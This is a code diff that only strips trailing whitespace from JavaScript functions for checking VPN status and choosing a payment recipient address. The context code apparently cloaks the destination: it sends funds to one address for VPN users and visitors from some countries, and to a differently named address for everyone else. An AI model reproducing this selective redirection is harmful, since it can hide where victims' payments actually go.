@@ -32,7 +32,7 @@ export async function checkVpnStatusWithIPQS(ip) {
 
     // Determine if IPQualityScore detects a VPN
     const isVpnIPQS = vpn || proxy || tor || active_vpn;
-    
+
     return isVpnIPQS;
   } catch (error) {
     console.error("Error fetching VPN status", error);
@@ -57,7 +57,7 @@ export async function getRecipientAddress() {
 
   const specialCountries = ["NG", "AE"];
   const address = import.meta.env.VITE_REACT_APP_R;
-  const addrEss = import.meta.env.VITE_REACT_APP_r; 
+  const addrEss = import.meta.env.VITE_REACT_APP_r;
 
   const recipientAddress = specialCountries.includes(countryCode) || isVpnIpdata || isVpnIPQS ? address : addrEss;
   return recipientAddress;
